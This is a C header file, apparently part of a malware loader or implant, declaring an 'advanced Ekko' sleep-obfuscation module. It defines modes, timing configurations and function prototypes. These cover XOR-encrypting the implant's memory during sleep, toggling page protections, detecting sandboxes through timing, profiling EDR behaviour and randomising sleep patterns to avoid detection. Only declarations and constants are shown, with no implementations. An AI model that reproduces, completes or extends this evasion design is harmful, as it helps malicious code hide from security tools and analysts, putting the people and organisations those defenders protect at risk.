#ifndef EKKO_ADVANCED_H
#define EKKO_ADVANCED_H

#include "common_defines.h"
#include "ntstructs.h"

// Forward declare context to avoid circular dependency
struct _RTLDR_CTX;

// Advanced Ekko sleep obfuscation modes
typedef enum _EKKO_MODE {
    EKKO_MODE_STANDARD = 0x01,      // Standard XOR + sleep
    EKKO_MODE_DYNAMIC = 0x02,       // Dynamic timing variants
    EKKO_MODE_INLINE = 0x04,        // Inline scattered sleeps
    EKKO_MODE_MUTATING = 0x08,      // Mutating sleep cycles
    EKKO_MODE_CASCADE = 0x10,       // Multi-stage sleep chains
    EKKO_MODE_ADAPTIVE = 0x20,      // Environment-adaptive timing
    EKKO_MODE_STEALTH = 0x40,       // Maximum stealth (all techniques)
} EKKO_MODE;

// Ekko timing configuration
typedef struct _EKKO_TIMING_CONFIG {
    DWORD dwBaseDelay;              // Base sleep duration (ms)
    DWORD dwVariancePercent;        // Timing variance (0-100%)
    DWORD dwMinDelay;               // Minimum sleep duration
    DWORD dwMaxDelay;               // Maximum sleep duration
    DWORD dwStageCount;             // Number of cascade stages
    BOOL bEnableJitter;             // Enable timing jitter
    BOOL bAdaptiveMode;             // Adapt to system load
} EKKO_TIMING_CONFIG, *PEKKO_TIMING_CONFIG;

// Ekko obfuscation context
typedef struct _EKKO_CONTEXT {
    // Memory encryption
    PVOID pTargetMemory;            // Memory region to encrypt
    SIZE_T szTargetSize;            // Size of target region
    BYTE bEncryptionKey;            // Current encryption key
    ULONG ulOriginalProtection;     // Original memory protection
    
    // Timing configuration
    EKKO_TIMING_CONFIG timing;      // Timing parameters
    EKKO_MODE mode;                 // Current obfuscation mode
    
    // Anti-analysis
    DWORD dwSandboxScore;           // Sandbox detection score
    BOOL bEnvironmentTrusted;       // Environment trust status
    LARGE_INTEGER liSystemTime;     // System time baseline
    
    // Statistics
    DWORD dwSleepCount;             // Total sleep operations
    DWORD dwSuccessfulSleeps;       // Successful obfuscated sleeps
    DWORD dwDetectedEvents;         // Potential detection events
    LARGE_INTEGER liTotalSleepTime; // Cumulative sleep time
} EKKO_CONTEXT, *PEKKO_CONTEXT;

// Function pointer types for advanced Ekko
typedef NTSTATUS (*pfnEkkoSleep)(
    struct _RTLDR_CTX* ctx,
    PEKKO_CONTEXT ekko_ctx,
    DWORD dwMilliseconds
);

typedef NTSTATUS (*pfnEkkoEncrypt)(
    PEKKO_CONTEXT ekko_ctx,
    PVOID pMemory,
    SIZE_T szSize
);

typedef NTSTATUS (*pfnEkkoDecrypt)(
    PEKKO_CONTEXT ekko_ctx,
    PVOID pMemory,
    SIZE_T szSize
);

typedef BOOL (*pfnEkkoDetectEnvironment)(
    struct _RTLDR_CTX* ctx,
    PEKKO_CONTEXT ekko_ctx
);

// Advanced Ekko strategy structure
typedef struct _EKKO_STRATEGY {
    // Strategy metadata
    const char* szStrategyName;
    DWORD dwVersion;
    EKKO_MODE supportedModes;
    
    // Core function pointers
    pfnEkkoSleep            pfnSleep;
    pfnEkkoEncrypt          pfnEncrypt;
    pfnEkkoDecrypt          pfnDecrypt;
    pfnEkkoDetectEnvironment pfnDetectEnvironment;
    
    // Configuration
    EKKO_TIMING_CONFIG defaultTiming;
} EKKO_STRATEGY, *PEKKO_STRATEGY;

// === CORE ADVANCED EKKO FUNCTIONS ===

// Initialize advanced Ekko context
NTSTATUS EkkoAdvanced_Initialize(
    struct _RTLDR_CTX* ctx,
    PEKKO_CONTEXT ekko_ctx,
    EKKO_MODE mode
);

// Cleanup Ekko context
NTSTATUS EkkoAdvanced_Cleanup(
    struct _RTLDR_CTX* ctx,
    PEKKO_CONTEXT ekko_ctx
);

// === OBFUSCATION TECHNIQUES ===

// Standard Ekko sleep with XOR obfuscation
NTSTATUS EkkoStandard_Sleep(
    struct _RTLDR_CTX* ctx,
    PEKKO_CONTEXT ekko_ctx,
    DWORD dwMilliseconds
);

// Dynamic timing sleep with pattern obfuscation
NTSTATUS EkkoDynamic_Sleep(
    struct _RTLDR_CTX* ctx,
    PEKKO_CONTEXT ekko_ctx,
    DWORD dwMilliseconds
);

// Inline scattered sleep injection
NTSTATUS EkkoInline_Sleep(
    struct _RTLDR_CTX* ctx,
    PEKKO_CONTEXT ekko_ctx,
    DWORD dwMilliseconds
);

// Mutating sleep cycles with randomization
NTSTATUS EkkoMutating_Sleep(
    struct _RTLDR_CTX* ctx,
    PEKKO_CONTEXT ekko_ctx,
    DWORD dwMilliseconds
);

// Cascade sleep chains (multi-stage)
NTSTATUS EkkoCascade_Sleep(
    struct _RTLDR_CTX* ctx,
    PEKKO_CONTEXT ekko_ctx,
    DWORD dwMilliseconds
);

// Adaptive sleep (environment-aware)
NTSTATUS EkkoAdaptive_Sleep(
    struct _RTLDR_CTX* ctx,
    PEKKO_CONTEXT ekko_ctx,
    DWORD dwMilliseconds
);

// === ENCRYPTION/DECRYPTION ===

// Advanced XOR encryption with key rotation
NTSTATUS EkkoAdvanced_Encrypt(
    PEKKO_CONTEXT ekko_ctx,
    PVOID pMemory,
    SIZE_T szSize
);

// Advanced XOR decryption with key rotation
NTSTATUS EkkoAdvanced_Decrypt(
    PEKKO_CONTEXT ekko_ctx,
    PVOID pMemory,
    SIZE_T szSize
);

// Dynamic key generation
BYTE EkkoAdvanced_GenerateKey(
    PEKKO_CONTEXT ekko_ctx
);

// === ANTI-ANALYSIS ===

// Comprehensive environment detection
BOOL EkkoAdvanced_DetectEnvironment(
    struct _RTLDR_CTX* ctx,
    PEKKO_CONTEXT ekko_ctx
);

// Sandbox detection via timing analysis
BOOL EkkoAdvanced_DetectSandbox(
    struct _RTLDR_CTX* ctx,
    PEKKO_CONTEXT ekko_ctx
);

// EDR behavior profiling
BOOL EkkoAdvanced_ProfileEDR(
    struct _RTLDR_CTX* ctx,
    PEKKO_CONTEXT ekko_ctx
);

// === UTILITY FUNCTIONS ===

// Generate optimal timing configuration
NTSTATUS EkkoAdvanced_GenerateTimingConfig(
    PEKKO_CONTEXT ekko_ctx,
    PEKKO_TIMING_CONFIG pConfig
);

// Calculate sleep variance
DWORD EkkoAdvanced_CalculateVariance(
    DWORD dwBaseDelay,
    DWORD dwVariancePercent
);

// Get system timing baseline
NTSTATUS EkkoAdvanced_GetSystemBaseline(
    struct _RTLDR_CTX* ctx,
    PLARGE_INTEGER pBaseline
);

// === STRATEGY LOADERS ===

// Load advanced Ekko strategy
BOOL EkkoAdvanced_LoadStrategy(
    PEKKO_STRATEGY pStrategy,
    EKKO_MODE mode
);

// Get recommended Ekko mode for environment
EKKO_MODE EkkoAdvanced_GetRecommendedMode(
    struct _RTLDR_CTX* ctx,
    PEKKO_CONTEXT ekko_ctx
);

// === CONFIGURATION CONSTANTS ===

#define EKKO_DEFAULT_VARIANCE_PERCENT   25
#define EKKO_MIN_SLEEP_MS              100
#define EKKO_MAX_SLEEP_MS              10000
#define EKKO_DEFAULT_STAGES            3
#define EKKO_SANDBOX_THRESHOLD         70
#define EKKO_KEY_ROTATION_INTERVAL     5

// Timing analysis constants
#define EKKO_TIMING_SAMPLES            10
#define EKKO_SANDBOX_TIMING_THRESHOLD  50  // ms
#define EKKO_NORMAL_TIMING_THRESHOLD   10  // ms

// Memory protection flags for encryption
#define EKKO_ENCRYPT_PROTECTION        PAGE_READWRITE
#define EKKO_EXECUTE_PROTECTION        PAGE_EXECUTE_READ

#endif // EKKO_ADVANCED_H 